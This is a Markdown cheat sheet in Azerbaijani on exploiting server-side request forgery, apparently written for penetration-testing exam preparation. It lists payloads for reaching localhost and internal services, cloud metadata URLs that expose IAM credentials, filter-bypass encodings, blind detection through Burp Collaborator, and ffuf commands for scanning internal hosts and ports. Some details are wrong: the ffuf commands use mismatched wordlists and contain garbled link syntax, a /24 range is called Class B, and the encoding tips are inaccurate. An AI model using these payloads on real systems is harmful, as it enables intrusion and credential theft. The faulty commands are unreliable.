---

```markdown
# 🌐 SSRF (Server-Side Request Forgery) Eksploytasiya Qeydləri

Bu sənəd veb tətbiqlərdə SSRF boşluqlarını aşkar etmək, daxili şəbəkələri skan etmək, filtrləri yan keçmək və kritik məlumatları çıxarmaq üçün praktiki bələdçidir.

---

## 📌 1. SSRF Növləri və Hücum Məntiqi

SSRF, hücumçunun həssas serveri manipulyasiya edərək onun adından kənar və ya daxili resurslara sorğu (HTTP/s və s.) göndərməsini təmin edən zəiflikdir.



* **Verbose (Görünən) SSRF:** Serverin digər tərəfdən aldığı cavab (response) birbaşa veb səhifədə görünür. Eksploytasiya etmək çox rahatdır.
* **Blind (Kor) SSRF:** Server arxa fonda sorğunu icra edir, lakin səhifədə heç bir məlumat və ya xəta göstərmir. Eksploytasiya üçün zamana əsaslanan (Time-based) və ya OOB (Out-of-Band) üsullarından istifadə olunur.

---

## 🛠️ 2. Əsas Hücum Hədəfləri və Payload-lar

Tətbiqdə URL qəbul edən parametrləri (məsələn: `?url=`, `?image=`, `?api=`, `?path=`) tapdıqda aşağıdakı ssenariləri yoxla:

### A. Localhost və Daxili Servislərə Giriş
Serverin daxilində işləyən, lakin kənara qapalı olan admin panelləri və ya servisləri hədəf alın:
* `http://127.0.0.1:80`
* `http://localhost:8080`
* `http://127.0.0.1/admin`

### B. Daxili Port Skanlanması (Port Scanning)
Burp Intruder və ya `ffuf` vasitəsilə fərqli portları yoxlayaraq daxili şəbəkədə hansı servislərin (məsələn: Redis, MySQL, Jenkins) aktiv olduğunu tapın:
* `http://127.0.0.1:FUZZ` (Port siyahısı olaraq `1-65535` və ya ən populyar portları seçin).

### C. Bulud İnfrastrukturlarının Meta-məlumatlarının Oğurlanması (Cloud Metadata)
Əgər hədəf tətbiq AWS, Azure və ya GCP kimi bulud servislərində yerləşirsə, xüsusi IP ünvanından daxili API açarlarını və şifrələri çəkə bilərsiniz.

| Bulud Provayderi | Sürətli Keçid Payload-u |
| :--- | :--- |
| **AWS / DigitalOcean** | `http://169.254.169.254/latest/meta-data/` |
| **AWS (IAM Şifrələri)** | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| **Google Cloud (GCP)** | `http://metadata.google.internal/computeMetadata/v1/` *(Başlıq tələb edə bilər)* |
| **Azure** | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` |

---

## 🛡️ 3. Filtrlərdən və WAF-dan Yan Keçmə Üsulları (Bypass)

İmtahanlarda proqramçılar çox vaxt `127.0.0.1` və ya `localhost` sözlərini bloklayırlar. Bu filtrləri sındırmaq üçün aşağıdakı üsullardan istifadə et:

### A. Alternativ Localhost İfadələri
Eyni nöqtəyə çıxan fərqli IP kombinasiyaları:
* `http://0.0.0.0` və ya `http://0`
* `http://127.1` (Sondakı sıfırlar buraxıla bilər)
* `http://[::]` (IPv6 formatında localhost)
* `http://2130706433` (IP-nin Dword formatı)
* `http://017700000001` (IP-nin Oktal/Səkkizlik formatı)
* `http://0x7f000001` (IP-nin Hex formatı)

### B. DNS Yenidən Yönləndirmə (DNS Redirection / Spoofing)
İnternetdə elə domenlər var ki, onları çağıranda birbaşa `127.0.0.1` ünvanına yönlənirlər. Filtr domen adını yoxlayır (keçirir), lakin server sorğunu icra edəndə localhost-a gedir:
* `http://spoofed.burpcollaborator.net` (Öz domeniniz)
* `http://localtest.me` (Avtomatik 127.0.0.1-ə yönlənir)
* `http://customer1.lvh.me` (lvh.me və bütün subdomenləri 127.0.0.1-dir)

### C. URL Çaşdırma (URL Parsing Tricks)
Veb serverlərin URL-i oxuma məntiqindəki boşluqlardan istifadə etmək:
* **@ Simvolu ilə:** `http://google.com@127.0.0.1` (Sistem google.com-a baxdığını düşünür, lakin sorğu @ işarəsindən sonrakı IP-yə gedir).
* **URL Kodlaşdırma:** Filtrləri çaşdırmaq üçün bəzi simvolları ikiqat (Double URL Encode) kodlaşdırın.
  * `.` -> `%2e`
  * `/` -> `%2f`

---

## 🙈 4. Kor (Blind) SSRF Eksploytasiyası

Əgər səhifədə heç bir nəticə qayıtmırsa, serverin sorğu göndərib-göndərmədiyini yoxlamaq üçün **Kənar Şəbəkə (OOB)** alətlərindən istifadə olunur.

1. **Burp Collaborator**-u aç və xüsusi linkini kopyala (məsələn: `xyz.oastify.com`).
2. Zəiflik olan parametrə yerləşdir: `?url=http://xyz.oastify.com`
3. Collaborator pəncərəsində **Poll Now** düyməsini sıx. Əgər hədəf serverdən DNS və ya HTTP sorğusu gəlibsə, Blind SSRF təsdiqlənib.

---

## 🤖 5. Avtomatlaşdırılmış Skanlama və Fuzzing

### `ffuf` ilə Daxili İP və ya Port Skanlanması
Hədəf sistemin daxili şəbəkəsində (məsələn: 192.168.1.X) hansı aktiv cihazların olduğunu tapmaq üçün:

```bash
# Daxili İP-lərin tapılması (B Class şəbəkə üçün)
ffuf -u '[http://target.com/preview.php?url=http://192.168.1.FUZZ](http://target.com/preview.php?url=http://192.168.1.FUZZ)' \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mr "admin" # Ekranda xüsusi sözü axtarmaq üçün

# Sürətli port skanlanması
ffuf -u '[http://target.com/preview.php?url=http://127.0.0.1:FUZZ](http://target.com/preview.php?url=http://127.0.0.1:FUZZ)' \
     -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt \
     -fs 0

```

```
